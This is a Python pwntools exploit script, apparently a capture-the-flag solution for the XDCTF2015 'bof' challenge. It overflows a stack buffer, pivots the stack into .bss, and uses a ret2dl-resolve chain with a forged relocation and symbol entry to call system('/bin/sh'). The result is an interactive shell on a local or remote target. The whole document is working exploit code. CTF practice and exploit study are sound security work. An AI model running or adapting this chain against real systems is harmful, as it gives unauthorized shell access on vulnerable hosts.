#!/usr/bin/python
#__author__:TaQini

from pwn import *
import roputils

context.log_level = 'debug'
context.arch = 'i386'

local_file  = '././bof'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# gadget
pr = 0x080492d3 # pop ebp ; ret
pppr = 0x080492d1 # pop esi ; pop edi ; pop ebp ; ret
leave = 0x08049105 # leave ; ret

# info
read_plt = elf.symbols['read']
write_plt = elf.symbols['write']

stack_size = 0x800
bss_addr = elf.bss()
base_stage = bss_addr + stack_size

rop = roputils.ROP(local_file)

# rop1
offset = 112
payload = 'A'*offset
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(base_stage) + p32(100)
payload += p32(pr) + p32(base_stage+24) + p32(leave)

pl =  rop.fill(offset)
pl += rop.call('read', 0, base_stage, 100)
pl += rop.dl_resolve_call(base_stage+20, base_stage)

ru('Welcome to XDCTF2015~!\n')
# sl(payload)
info_addr('base_stage', base_stage)
debug()
sl(pl)

# info_addr('tag',addr)
# log.warning('--------------')

# pl2
cmd = "/bin/sh"
plt_0 = 0x8049020
rel_plt = 0x8048364 
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x0804820c
dynstr = 0x080482ac
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # align to 0x10
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA' 
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += p32(0xdeadbeef)
payload2 += p32(base_stage + 80)
payload2 += p32(0xdeadbeef) * 2 # pppr 
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += 'system\0'
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))


pl2 =  rop.string('/bin/sh')
pl2 += rop.fill(20, pl2)
pl2 += rop.dl_resolve_data(base_stage + 20, 'system')
pl2 += rop.fill(100,pl2)

sleep(30)
sl(pl2)
# sl(payload2)

p.interactive()

